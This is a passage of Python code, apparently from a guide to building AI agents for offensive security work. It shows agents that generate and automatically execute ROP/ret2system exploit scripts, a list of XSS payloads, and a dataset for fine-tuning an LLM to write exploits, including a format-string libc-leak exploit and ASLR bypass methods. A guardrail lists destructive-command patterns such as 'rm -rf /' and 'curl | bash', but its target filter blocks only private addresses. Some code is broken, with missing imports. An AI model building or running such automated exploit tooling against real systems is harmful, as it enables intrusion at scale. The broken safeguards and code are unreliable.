        mitigations = await self._check_mitigations(binary_path)
        
        return {
            "binary": binary_path,
            "functions": functions,
            "strings": strings,
            "mitigations": mitigations
        }
    
    async def find_vulnerabilities(self, params: dict) -> dict:
        """Find vulnerabilities in a binary"""
        binary_path = params['binary_path']
        
        # Analyze binary
        analysis = await self.analyze(params)
        
        # Look for dangerous functions
        dangerous_functions = [
            'strcpy', 'strcat', 'sprintf', 'gets', 'scanf',
            'memcpy', 'memmove', 'printf', 'fprintf', 'snprintf'
        ]
        
        # Check imports
        imports = await self._get_imports(binary_path)
        
        findings = []
        for func in dangerous_functions:
            if func in imports:
                # Find calls to this function
                xrefs = await self.mcp.call("ghidra", "ghidra_xrefs", {
                    "address": f"IMPORT:{func}"
                })
                
                findings.append({
                    "type": "dangerous_function",
                    "function": func,
                    "references": xrefs,
                    "exploitability": self._assess_exploitability(func)
                })
        
        return {
            "binary": binary_path,
            "findings": findings,
            "summary": f"Found {len(findings)} potential vulnerabilities"
        }
    
    async def develop_exploit(self, params: dict) -> dict:
        """Develop an exploit"""
        binary_path = params['binary_path']
        vulnerability = params['vulnerability']
        
        # Get binary info
        info = await self._get_binary_info(binary_path)
        
        # Find gadgets if needed
        gadgets = await self.find_gadgets({"binary_path": binary_path})
        
        # Generate exploit
        exploit_code = self._generate_exploit(
            binary_path,
            vulnerability,
            info,
            gadgets
        )
        
        return {
            "binary": binary_path,
            "vulnerability": vulnerability,
            "exploit_code": exploit_code,
            "instructions": "Save as exploit.py and run with python3"
        }
    
    async def find_gadgets(self, params: dict) -> dict:
        """Find ROP gadgets"""
        binary_path = params['binary_path']
        
        # Use ROPgadget
        result = await self.mcp.call("ropgadget", "ropgadget_find", {
            "binary": binary_path,
            "type": "rop"
        })
        
        return result
    
    async def generate_shellcode(self, params: dict) -> dict:
        """Generate shellcode"""
        arch = params.get('arch', 'amd64')
        payload = params.get('payload', 'execve')
        
        # Use pwntools
        result = await self.mcp.call("pwntools", "shellcraft", {
            "arch": arch,
            "payload": payload
        })
        
        return result
    
    async def _check_mitigations(self, binary_path: str) -> dict:
        """Check binary mitigations"""
        result = await self.mcp.call("pwntools", "checksec", {
            "binary": binary_path
        })
        return result
    
    async def _get_imports(self, binary_path: str) -> list:
        """Get binary imports"""
        result = await self.mcp.call("ghidra", "ghidra_search", {
            "pattern": "IMPORT",
            "type": "string"
        })
        return result.get('results', [])
    
    async def _get_binary_info(self, binary_path: str) -> dict:
        """Get binary information"""
        result = await self.mcp.call("pwntools", "elf_info", {
            "binary": binary_path
        })
        return result
    
    def _assess_exploitability(self, function: str) -> str:
        """Assess exploitability of a dangerous function"""
        high_risk = ['strcpy', 'strcat', 'gets', 'sprintf']
        medium_risk = ['memcpy', 'memmove', 'scanf']
        
        if function in high_risk:
            return 'high'
        elif function in medium_risk:
            return 'medium'
        else:
            return 'low'
    
    def _generate_exploit(self, binary, vulnerability, info, gadgets) -> str:
        """Generate exploit code"""
        return f'''#!/usr/bin/env python3
"""
Auto-generated exploit for {binary}
Vulnerability: {vulnerability}
"""

from pwn import *

context.arch = '{info.get("arch", "amd64")}'
context.os = 'linux'

elf = ELF('{binary}')

def exploit():
    p = process('{binary}')
    
    # Your exploit here
    # payload = b'A' * offset
    # payload += p64(gadget)
    # p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    exploit()
'''
```

---

### 2.3.3 Web Application Analysis Agent

```python
#!/usr/bin/env python3
"""
Web Application Analysis Agent
Specialized agent for web application security testing
"""

import asyncio
import json
from mcp.client import MCPClient

class WebAnalysisAgent:
    def __init__(self, name: str = "web-analyst"):
        self.name = name
        self.available = True
        self.current_task = None
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("burp", "burp-mcp")
        self.mcp.register_server("zap", "zap-mcp")
        self.mcp.register_server("sqlmap", "sqlmap-mcp")
        self.mcp.register_server("nuclei", "nuclei-mcp")
    
    def is_available(self) -> bool:
        return self.available
    
    async def execute(self, task) -> Any:
        """Execute a web analysis task"""
        self.available = False
        self.current_task = task
        
        try:
            action = task.description.get('action')
            
            if action == 'scan':
                result = await self.scan(task.description)
            elif action == 'crawl':
                result = await self.crawl(task.description)
            elif action == 'test_sqli':
                result = await self.test_sqli(task.description)
            elif action == 'test_xss':
                result = await self.test_xss(task.description)
            elif action == 'test_auth':
                result = await self.test_auth(task.description)
            elif action == 'full_assessment':
                result = await self.full_assessment(task.description)
            else:
                result = {'error': f'Unknown action: {action}'}
            
            return result
        finally:
            self.available = True
            self.current_task = None
    
    async def scan(self, params: dict) -> dict:
        """Scan a web application"""
        url = params['url']
        
        # Use Burp/ZAP for scanning
        result = await self.mcp.call("burp", "burp_scan", {"url": url})
        
        return result
    
    async def crawl(self, params: dict) -> dict:
        """Crawl a web application"""
        url = params['url']
        
        result = await self.mcp.call("burp", "burp_spider", {"url": url})
        
        return result
    
    async def test_sqli(self, params: dict) -> dict:
        """Test for SQL injection"""
        url = params['url']
        param = params.get('param', 'id')
        
        result = await self.mcp.call("sqlmap", "sqlmap_scan", {
            "url": url,
            "param": param
        })
        
        return result
    
    async def test_xss(self, params: dict) -> dict:
        """Test for XSS"""
        url = params['url']
        param = params.get('param', 'q')
        
        # Use custom XSS detection
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            # Test URL
            results.append({
                "payload": payload,
                "url": test_url,
                "vulnerable": False  # Would check actual response
            })
        
        return {"results": results}
    
    async def test_auth(self, params: dict) -> dict:
        """Test authentication"""
        url = params['url']
        
        # Test common auth issues
        tests = [
            {"name": "default_credentials", "result": "pending"},
            {"name": "weak_password_policy", "result": "pending"},
            {"name": "session_fixation", "result": "pending"},
            {"name": "session_timeout", "result": "pending"},
            {"name": "logout_invalidation", "result": "pending"},
        ]
        
        return {"tests": tests}
    
    async def full_assessment(self, params: dict) -> dict:
        """Perform full web assessment"""
        url = params['url']
        
        results = {
            "url": url,
            "scan": await self.scan(params),
            "crawl": await self.crawl(params),
            "sqli": await self.test_sqli(params),
            "xss": await self.test_xss(params),
            "auth": await self.test_auth(params),
        }
        
        # Generate summary
        results["summary"] = self._generate_summary(results)
        
        return results
    
    def _generate_summary(self, results: dict) -> str:
        """Generate assessment summary"""
        return f"""
Web Assessment Summary
======================
URL: {results['url']}

Scan Results: {results['scan']}
Crawl Results: {results['crawl']}
SQLi Results: {results['sqli']}
XSS Results: {results['xss']}
Auth Results: {results['auth']}

Recommendations:
1. Review scan findings
2. Address SQL injection if found
3. Fix XSS vulnerabilities
4. Strengthen authentication
5. Implement security headers
"""
```

---

### 2.3.4 Fuzzing Agent

```python
#!/usr/bin/env python3
"""
Fuzzing Agent
Specialized agent for automated fuzzing
"""

import asyncio
import json
import subprocess
import os
from mcp.client import MCPClient

class FuzzingAgent:
    def __init__(self, name: str = "fuzzer"):
        self.name = name
        self.available = True
        self.current_task = None
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("afl", "afl-mcp")
        self.mcp.register_server("libfuzzer", "libfuzzer-mcp")
    
    def is_available(self) -> bool:
        return self.available
    
    async def execute(self, task) -> Any:
        """Execute a fuzzing task"""
        self.available = False
        self.current_task = task
        
        try:
            action = task.description.get('action')
            
            if action == 'fuzz':
                result = await self.fuzz(task.description)
            elif action == 'fuzz_with_ai':
                result = await self.fuzz_with_ai(task.description)
            elif action == 'analyze_crash':
                result = await self.analyze_crash(task.description)
            elif action == 'minimize_input':
                result = await self.minimize_input(task.description)
            else:
                result = {'error': f'Unknown action: {action}'}
            
            return result
        finally:
            self.available = True
            self.current_task = None
    
    async def fuzz(self, params: dict) -> dict:
        """Run a fuzzing campaign"""
        binary = params['binary']
        input_dir = params.get('input_dir', './input')
        output_dir = params.get('output_dir', './output')
        duration = params.get('duration', 3600)
        
        # Prepare directories
        os.makedirs(input_dir, exist_ok=True)
        os.makedirs(output_dir, exist_ok=True)
        
        # Create seed inputs
        seeds = params.get('seeds', [b'seed', b'test', b'AAAA'])
        for i, seed in enumerate(seeds):
            with open(f'{input_dir}/seed{i}', 'wb') as f:
                f.write(seed)
        
        # Run AFL++
        cmd = [
            'afl-fuzz',
            '-i', input_dir,
            '-o', output_dir,
            '-V', str(duration),
            '--', binary, '@@'
        ]
        
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await process.communicate()
        
        # Collect crashes
        crashes = []
        crash_dir = f'{output_dir}/default/crashes'
        if os.path.exists(crash_dir):
            for f in os.listdir(crash_dir):
                if f.startswith('id:'):
                    crashes.append(f'{crash_dir}/{f}')
        
        return {
            "binary": binary,
            "duration": duration,
            "crashes": crashes,
            "crash_count": len(crashes)
        }
    
    async def fuzz_with_ai(self, params: dict) -> dict:
        """Fuzz with AI-generated inputs"""
        binary = params['binary']
        iterations = params.get('iterations', 1000)
        
        from openai import OpenAI
        client = OpenAI()
        
        crashes = []
        
        for i in range(iterations):
            # Generate input with LLM
            prompt = f"""
            Generate a fuzzing input for a binary parser.
            Iteration: {i}
            Focus: edge cases, boundary conditions, malformed data
            Format: raw bytes (hex encoded)
            """
            
            response = client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a fuzzing expert."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.9
            )
            
            input_data = response.choices[0].message.content
            
            # Write input
            with open('/tmp/fuzz_input', 'w') as f:
                f.write(input_data)
            
            # Run binary
            try:
                result = subprocess.run(
                    [binary, '/tmp/fuzz_input'],
                    capture_output=True,
                    timeout=5
                )
                
                if result.returncode != 0:
                    crashes.append({
                        "iteration": i,
                        "input": input_data,
                        "returncode": result.returncode,
                        "stderr": result.stderr.decode('utf-8', errors='ignore')
                    })
            except subprocess.TimeoutExpired:
                crashes.append({
                    "iteration": i,
                    "input": input_data,
                    "error": "timeout"
                })
        
        return {
            "binary": binary,
            "iterations": iterations,
            "crashes": crashes,
            "crash_count": len(crashes)
        }
    
    async def analyze_crash(self, params: dict) -> dict:
        """Analyze a crash"""
        crash_file = params['crash_file']
        
        # Run under GDB
        cmd = [
            'gdb', '-batch',
            '-ex', 'run',
            '-ex', 'bt',
            '-ex', 'info registers',
            '--args', params['binary'], crash_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Analyze with LLM
        from openai import OpenAI
        client = OpenAI()
        
        prompt = f"""
        Analyze this crash:
        
        GDB output:
        {result.stdout}
        
        Provide:
        1. Crash type (segfault, abort, etc.)
        2. Faulting instruction
        3. Register state
        4. Likely root cause
        5. Exploitability assessment
        """
        
        response = client.chat.completions.create(
            model="gpt-4",
            messages=[
                {"role": "system", "content": "You are a vulnerability researcher."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3
        )
        
        return {
            "crash_file": crash_file,
            "gdb_output": result.stdout,
            "analysis": response.choices[0].message.content
        }
    
    async def minimize_input(self, params: dict) -> dict:
        """Minimize a crashing input"""
        crash_file = params['crash_file']
        binary = params['binary']
        
        # Use afl-tmin
        cmd = [
            'afl-tmin',
            '-i', crash_file,
            '-o', '/tmp/minimized',
            '--', binary, '@@'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        return {
            "original": crash_file,
            "minimized": '/tmp/minimized',
            "output": result.stdout
        }
```

---

### 2.3.5 Malware Analysis Agent

```python
#!/usr/bin/env python3
"""
Malware Analysis Agent
Specialized agent for malware analysis
"""

import asyncio
import json
import subprocess
import os
from mcp.client import MCPClient

class MalwareAnalysisAgent:
    def __init__(self, name: str = "malware-analyst"):
        self.name = name
        self.available = True
        self.current_task = None
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("ghidra", "ghidra-mcp")
        self.mcp.register_server("yara", "yara-mcp")
        self.mcp.register_server("volatility", "volatility-mcp")
        self.mcp.register_server("frida", "frida-mcp")
    
    def is_available(self) -> bool:
        return self.available
    
    async def execute(self, task) -> Any:
        """Execute a malware analysis task"""
        self.available = False
        self.current_task = task
        
        try:
            action = task.description.get('action')
            
            if action == 'static_analysis':
                result = await self.static_analysis(task.description)
            elif action == 'dynamic_analysis':
                result = await self.dynamic_analysis(task.description)
            elif action == 'yara_scan':
                result = await self.yara_scan(task.description)
            elif action == 'extract_iocs':
                result = await self.extract_iocs(task.description)
            elif action == 'full_analysis':
                result = await self.full_analysis(task.description)
            else:
                result = {'error': f'Unknown action: {action}'}
            
            return result
        finally:
            self.available = True
            self.current_task = None
    
    async def static_analysis(self, params: dict) -> dict:
        """Perform static analysis"""
        sample = params['sample']
        
        results = {
            "sample": sample,
            "file_type": self._get_file_type(sample),
            "hashes": self._get_hashes(sample),
            "strings": self._get_strings(sample),
            "imports": self._get_imports(sample),
            "sections": self._get_sections(sample),
            "entropy": self._get_entropy(sample),
            "packer": self._detect_packer(sample),
        }
        
        return results
    
    async def dynamic_analysis(self, params: dict) -> dict:
        """Perform dynamic analysis"""
        sample = params['sample']
        duration = params.get('duration', 60)
        
        # Run in sandbox
        results = {
            "sample": sample,
            "processes": [],
            "network": [],
            "files": [],
            "registry": [],
        }
        
        # Would run in actual sandbox (Cuckoo, CAPE, etc.)
        # For now, return placeholder
        
        return results
    
    async def yara_scan(self, params: dict) -> dict:
        """Scan with YARA rules"""
        sample = params['sample']
        rules = params.get('rules', 'rules/')
        
        result = await self.mcp.call("yara", "yara_scan", {
            "file": sample,
            "rules": rules
        })
        
        return result
    
    async def extract_iocs(self, params: dict) -> dict:
        """Extract IOCs from sample"""
        sample = params['sample']
        
        # Extract IOCs
        strings = self._get_strings(sample)
        
        iocs = {
            "domains": [],
            "ips": [],
            "urls": [],
            "emails": [],
            "hashes": [],
            "registry_keys": [],
            "file_paths": [],
        }
        
        import re
        
        for s in strings:
            # Extract domains
            domains = re.findall(r'[a-zA-Z0-9.-]+\.(com|net|org|io|ru|cn|onion)', s)
            iocs["domains"].extend(domains)
            
            # Extract IPs
            ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', s)
            iocs["ips"].extend(ips)
            
            # Extract URLs
            urls = re.findall(r'https?://[^\s]+', s)
            iocs["urls"].extend(urls)
            
            # Extract emails
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', s)
            iocs["emails"].extend(emails)
            
            # Extract registry keys
            reg_keys = re.findall(r'HKEY_[A-Z_]+\\[^\s]+', s)
            iocs["registry_keys"].extend(reg_keys)
            
            # Extract file paths
            paths = re.findall(r'[A-Z]:\\[^\s]+', s)
            iocs["file_paths"].extend(paths)
        
        # Deduplicate
        for key in iocs:
            iocs[key] = list(set(iocs[key]))
        
        return iocs
    
    async def full_analysis(self, params: dict) -> dict:
        """Perform full malware analysis"""
        sample = params['sample']
        
        results = {
            "sample": sample,
            "static": await self.static_analysis(params),
            "dynamic": await self.dynamic_analysis(params),
            "yara": await self.yara_scan(params),
            "iocs": await self.extract_iocs(params),
        }
        
        # Generate summary
        results["summary"] = self._generate_summary(results)
        
        return results
    
    def _get_file_type(self, sample: str) -> str:
        """Get file type"""
        result = subprocess.run(['file', sample], capture_output=True, text=True)
        return result.stdout.strip()
    
    def _get_hashes(self, sample: str) -> dict:
        """Get file hashes"""
        import hashlib
        
        hashes = {}
        
        with open(sample, 'rb') as f:
            data = f.read()
        
        hashes['md5'] = hashlib.md5(data).hexdigest()
        hashes['sha1'] = hashlib.sha1(data).hexdigest()
        hashes['sha256'] = hashlib.sha256(data).hexdigest()
        
        return hashes
    
    def _get_strings(self, sample: str) -> list:
        """Get strings from sample"""
        result = subprocess.run(['strings', '-n', '6', sample], capture_output=True, text=True)
        return result.stdout.strip().split('\n')
    
    def _get_imports(self, sample: str) -> list:
        """Get imports from sample"""
        # Would use PE analysis tools
        return []
    
    def _get_sections(self, sample: str) -> list:
        """Get sections from sample"""
        # Would use PE analysis tools
        return []
    
    def _get_entropy(self, sample: str) -> float:
        """Calculate file entropy"""
        import math
        
        with open(sample, 'rb') as f:
            data = f.read()
        
        if not data:
            return 0.0
        
        entropy = 0.0
        for i in range(256):
            freq = data.count(i) / len(data)
            if freq > 0:
                entropy -= freq * math.log2(freq)
        
        return entropy
    
    def _detect_packer(self, sample: str) -> str:
        """Detect packer"""
        # Would use DIE or similar
        return "Unknown"
    
    def _generate_summary(self, results: dict) -> str:
        """Generate analysis summary"""
        return f"""
Malware Analysis Summary
========================
Sample: {results['sample']}
Type: {results['static']['file_type']}
MD5: {results['static']['hashes']['md5']}
SHA256: {results['static']['hashes']['sha256']}
Entropy: {results['static']['entropy']:.2f}

YARA Matches: {results['yara']}
IOCs Found: {sum(len(v) for v in results['iocs'].values())}

Recommendations:
1. Isolate affected systems
2. Block identified IOCs
3. Update YARA rules
4. Conduct forensic investigation
"""
```

---

### 2.3.6 Exploit Development Agent

```python
#!/usr/bin/env python3
"""
Exploit Development Agent
Specialized agent for exploit development
"""

import asyncio
import json
from mcp.client import MCPClient

class ExploitDevAgent:
    def __init__(self, name: str = "exploit-dev"):
        self.name = name
        self.available = True
        self.current_task = None
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("pwntools", "pwntools-mcp")
        self.mcp.register_server("ropgadget", "ropgadget-mcp")
        self.mcp.register_server("ghidra", "ghidra-mcp")
        self.mcp.register_server("gdb", "gdb-mcp")
    
    def is_available(self) -> bool:
        return self.available
    
    async def execute(self, task) -> Any:
        """Execute an exploit development task"""
        self.available = False
        self.current_task = task
        
        try:
            action = task.description.get('action')
            
            if action == 'build_rop_chain':
                result = await self.build_rop_chain(task.description)
            elif action == 'build_shellcode':
                result = await self.build_shellcode(task.description)
            elif action == 'build_exploit':
                result = await self.build_exploit(task.description)
            elif action == 'test_exploit':
                result = await self.test_exploit(task.description)
            else:
                result = {'error': f'Unknown action: {action}'}
            
            return result
        finally:
            self.available = True
            self.current_task = None
    
    async def build_rop_chain(self, params: dict) -> dict:
        """Build a ROP chain"""
        binary = params['binary']
        target = params['target']  # e.g., "system('/bin/sh')"
        
        # Get gadgets
        gadgets = await self.mcp.call("ropgadget", "ropgadget_find", {
            "binary": binary,
            "type": "rop"
        })
        
        # Build chain with pwntools
        result = await self.mcp.call("pwntools", "build_rop", {
            "binary": binary,
            "target": target,
            "gadgets": gadgets
        })
        
        return result
    
    async def build_shellcode(self, params: dict) -> dict:
        """Build shellcode"""
        arch = params.get('arch', 'amd64')
        payload = params.get('payload', 'execve')
        encoder = params.get('encoder', None)
        
        result = await self.mcp.call("pwntools", "shellcraft", {
            "arch": arch,
            "payload": payload,
            "encoder": encoder
        })
        
        return result
    
    async def build_exploit(self, params: dict) -> dict:
        """Build a complete exploit"""
        binary = params['binary']
        vulnerability = params['vulnerability']
        offset = params.get('offset')
        
        # Get binary info
        info = await self.mcp.call("pwntools", "elf_info", {"binary": binary})
        
        # Get gadgets
        gadgets = await self.mcp.call("ropgadget", "ropgadget_find", {
            "binary": binary,
            "type": "rop"
        })
        
        # Get shellcode
        shellcode = await self.mcp.call("pwntools", "shellcraft", {
            "arch": info.get('arch', 'amd64'),
            "payload": 'execve'
        })
        
        # Build exploit
        exploit_code = f'''#!/usr/bin/env python3
"""
Auto-generated exploit for {binary}
Vulnerability: {vulnerability}
"""

from pwn import *

context.arch = '{info.get("arch", "amd64")}'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('{binary}')

# Offset to return address
OFFSET = {offset or 64}

# ROP gadgets
pop_rdi = {gadgets.get('pop_rdi', '0x0')}
ret = {gadgets.get('ret', '0x0')}

# Shellcode
shellcode = {repr(shellcode)}

def exploit():
    p = process('{binary}')
    
    # Build payload
    payload = b'A' * OFFSET
    payload += p64(ret)  # Stack alignment
    payload += p64(pop_rdi)
    payload += p64(next(elf.search(b'/bin/sh')))
    payload += p64(elf.plt['system'])
    
    # Send payload
    p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    exploit()
'''
        
        return {
            "binary": binary,
            "vulnerability": vulnerability,
            "exploit_code": exploit_code,
            "offset": offset,
            "gadgets": gadgets,
            "shellcode": shellcode
        }
    
    async def test_exploit(self, params: dict) -> dict:
        """Test an exploit"""
        exploit_code = params['exploit_code']
        binary = params['binary']
        
        # Write exploit to file
        with open('/tmp/exploit.py', 'w') as f:
            f.write(exploit_code)
        
        # Run exploit
        result = await asyncio.create_subprocess_exec(
            'python3', '/tmp/exploit.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.dirname(binary)
        )
        
        stdout, stderr = await result.communicate()
        
        return {
            "success": result.returncode == 0,
            "stdout": stdout.decode('utf-8', errors='ignore'),
            "stderr": stderr.decode('utf-8', errors='ignore'),
            "returncode": result.returncode
        }
```

---

### 2.3.7 Agent Communication for Software Operations

```python
#!/usr/bin/env python3
"""
Software Operations Message Bus
Enables communication between specialized software agents
"""

import asyncio
import json
from enum import Enum
from datetime import datetime
import aio_pika

class MessageType(Enum):
    TASK = "task"
    RESULT = "result"
    QUERY = "query"
    RESPONSE = "response"
    EVENT = "event"
    HEARTBEAT = "heartbeat"

class SoftwareMessageBus:
    def __init__(self, rabbitmq_url: str = 'amqp://guest:guest@localhost/'):
        self.rabbitmq_url = rabbitmq_url
        self.connection = None
        self.channel = None
        self.queues = {}
        self.handlers = {}
    
    async def connect(self):
        """Connect to RabbitMQ"""
        self.connection = await aio_pika.connect_robust(self.rabbitmq_url)
        self.channel = await self.connection.channel()
    
    async def disconnect(self):
        """Disconnect from RabbitMQ"""
        if self.connection:
            await self.connection.close()
    
    async def publish(self, message: dict):
        """Publish a message"""
        queue_name = f"agent:{message['recipient']}"
        if queue_name not in self.queues:
            self.queues[queue_name] = await self.channel.declare_queue(queue_name, durable=True)
        
        await self.channel.default_exchange.publish(
            aio_pika.Message(body=json.dumps(message).encode()),
            routing_key=queue_name
        )
    
    async def subscribe(self, agent_name: str, handler):
        """Subscribe to messages"""
        queue_name = f"agent:{agent_name}"
        queue = await self.channel.declare_queue(queue_name, durable=True)
        
        async def callback(message: aio_pika.IncomingMessage):
            async with message.process():
                msg = json.loads(message.body.decode())
                await handler(msg)
        
        await queue.consume(callback)
        self.handlers[agent_name] = handler
    
    async def broadcast(self, message: dict):
        """Broadcast to all agents"""
        for queue_name in self.queues:
            if queue_name.startswith('agent:'):
                await self.channel.default_exchange.publish(
                    aio_pika.Message(body=json.dumps(message).encode()),
                    routing_key=queue_name
                )

# Example usage
async def main():
    bus = SoftwareMessageBus()
    await bus.connect()
    
    # Subscribe as binary analyst
    async def handle_message(msg):
        print(f"Received: {msg}")
    
    await bus.subscribe("binary-analyst", handle_message)
    
    # Publish a task
    await bus.publish({
        "type": "task",
        "sender": "manager",
        "recipient": "binary-analyst",
        "payload": {
            "action": "analyze",
            "binary_path": "/path/to/binary"
        },
        "timestamp": datetime.now().isoformat()
    })
    
    await asyncio.sleep(10)
    await bus.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
```

---

### 2.3.8 Agent Training for Software Tasks

```python
#!/usr/bin/env python3
"""
Fine-tune an LLM for software security tasks
"""

from datasets import Dataset
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    TrainingArguments,
    Trainer,
    DataCollatorForLanguageModeling
)

def prepare_software_dataset():
    """Prepare dataset for software security fine-tuning"""
    
    examples = [
        {
            "instruction": "Find the buffer overflow in this C code",
            "response": """Looking at the code, I can identify a buffer overflow vulnerability:

**Vulnerability:** Stack buffer overflow in the `vulnerable()` function
**Location:** Line 5 - `strcpy(buffer, input)`
**Root Cause:** The `strcpy()` function copies data from `input` to `buffer` without checking bounds. The `buffer` is only 64 bytes, but `input` can be arbitrarily long.
**Exploitability:** High - An attacker can provide input longer than 64 bytes to overwrite the return address on the stack.

**Proof of Concept:**
```python
payload = b'A' * 64      # Fill buffer
payload += b'B' * 8       # Overwrite saved RBP
payload += p64(win_addr)  # Overwrite return address
```

**Suggested Fix:**
```c
void vulnerable(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0';
    printf("Hello, %s\\n", buffer);
}
```"""
        },
        {
            "instruction": "Explain how to bypass ASLR",
            "response": """ASLR (Address Space Layout Randomization) can be bypassed using several techniques:

**1. Information Leak**
The most reliable method. Find a vulnerability that leaks memory addresses:
- Format string vulnerabilities (`%p`, `%x`)
- Out-of-bounds reads
- Uninitialized memory disclosure
- Heap address leaks

**2. Brute Force**
If ASLR entropy is low (e.g., 16 bits), brute force the address:
- 1/256 chance for 8-bit entropy
- 1/65536 chance for 16-bit entropy
- Not viable for 32+ bits of entropy

**3. Partial Overwrite**
Overwrite only the lower bytes of a pointer:
- ASLR randomizes upper bits
- Lower 12 bits are fixed (page offset)
- Overwrite 1-2 bytes to redirect within same page

**4. Heap Spray**
Spray the heap with NOP sleds and shellcode:
- Increases probability of landing on shellcode
- Combined with partial overwrite

**5. ret2plt / ret2got**
Use PLT/GOT entries which may have predictable addresses:
- If binary is not PIE, PLT is fixed
- Read GOT entry to leak libc address

**6. Fork Brute Force**
If the target forks, ASLR is not re-randomized:
- Brute force one byte at a time
- Child processes share parent's address space""",
        },
        {
            "instruction": "Write a Python exploit for a format string vulnerability",
            "response": """Here's a format string exploit using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')

def exploit():
    p = process('./vulnerable')
    
    # Step 1: Leak addresses using format string
    # Find offset to our buffer on the stack
    p.sendline(b'%p.' * 20)
    leaks = p.recvline().split(b'.')
    
    # Find libc leak (look for 0x7f... addresses)
    libc_leak = None
    for leak in leaks:
        try:
            addr = int(leak, 16)
            if addr > 0x7f0000000000:
                libc_leak = addr
                break
        except:
            continue
    
    log.info(f"Libc leak: {hex(libc_leak)}")
    
    # Step 2: Calculate libc base
    # Adjust offset based on what was leaked
    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
    log.info(f"Libc base: {hex(libc_base)}")
    
    # Step 3: Calculate system and /bin/sh
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    log.info(f"System: {hex(system)}")
    log.info(f"/bin/sh: {hex(bin_sh)}")
    
    # Step 4: Write system address to GOT
    # Use format string write
    # ... (implementation depends on specific vulnerability)
    
    p.interactive()

if __name__ == "__main__":
    exploit()
```

**Key concepts:**
- `%p` leaks pointers from the stack
- `%n` writes to an address
- `%hn` writes 2 bytes
- `%hhn` writes 1 byte
- Use `%<value>c` to control output length
- Use positional parameters `%<n>$p` to select stack position"""
        },
    ]
    
    return Dataset.from_list(examples)

def format_instruction(example):
    return {
        "text": f"### Instruction:\n{example['instruction']}\n\n### Response:\n{example['response']}"
    }

# Load model
model_name = "meta-llama/Llama-2-7b-hf"
tokenizer = AutoTokenizer.from_pretrained(model_name)
model = AutoModelForCausalLM.from_pretrained(model_name)

# Prepare dataset
dataset = prepare_software_dataset()
dataset = dataset.map(format_instruction)

# Tokenize
def tokenize_function(examples):
    return tokenizer(examples["text"], truncation=True, padding="max_length", max_length=1024)

tokenized_dataset = dataset.map(tokenize_function, batched=True)

# Training arguments
training_args = TrainingArguments(
    output_dir="./software-agent",
    num_train_epochs=3,
    per_device_train_batch_size=2,
    gradient_accumulation_steps=8,
    learning_rate=2e-5,
    warmup_steps=100,
    logging_steps=10,
    save_steps=100,
)

# Data collator
data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)

# Trainer
trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=tokenized_dataset,
    data_collator=data_collator,
)

# Train
trainer.train()

# Save
trainer.save_model("./software-agent-final")
tokenizer.save_pretrained("./software-agent-final")
```

---

### 2.3.9 Safety & Security for AI-Driven Software Operations

```python
#!/usr/bin/env python3
"""
Safety guardrails for AI-driven software operations
"""

import re
import logging
from typing import Tuple

class SoftwareSafetyGuardrails:
    """Safety guardrails for AI-controlled software operations"""
    
    def __init__(self):
        self.logger = logging.getLogger("software.safety")
        
        # Dangerous patterns to block
        self.dangerous_patterns = [
            r'rm\s+-rf\s+/',
            r'mkfs\.',
            r'dd\s+if=.*of=/dev/',
            r':\(\)\s*\{\s*:\|:&\s*\};:',
            r'chmod\s+777\s+/',
            r'curl.*\|\s*bash',
            r'wget.*\|\s*sh',
        ]
        
        # Restricted targets
        self.restricted_targets = [
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '169.254.',
            '10.',
            '192.168.',
            '172.16.',
        ]
        
        # Rate limits
        self.rate_limits = {
            'requests_per_second': 10,
            'exploits_per_hour': 5,
            'fuzzing_iterations': 100000,
        }
        
        # Audit log
        self.audit_log = []
    
    def validate_command(self, command: str) -> Tuple[bool, str]:
        """Validate a shell command"""
        for pattern in self.dangerous_patterns:
            if re.search(pattern, command):
                self._log_violation('dangerous_command', command)
                return False, f"Dangerous command pattern detected: {pattern}"
        
        return True, "Command validated"
    
    def validate_target(self, target: str) -> Tuple[bool, str]:
        """Validate a target address"""
        for restricted in self.restricted_targets:
            if target.startswith(restricted):
                self._log_violation('restricted_target', target)
                return False, f"Target {target} is restricted"
        
        return True, "Target validated"
    
    def validate_exploit(self, exploit_code: str) -> Tuple[bool, str]:
        """Validate exploit code"""
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, exploit_code):
                self._log_violation('dangerous_exploit', pattern)
                return False, f"Dangerous pattern in exploit: {pattern}"
        
        return True, "Exploit validated"
    
    def validate_fuzzing(self, iterations: int) -> Tuple[bool, str]:
        """Validate fuzzing parameters"""
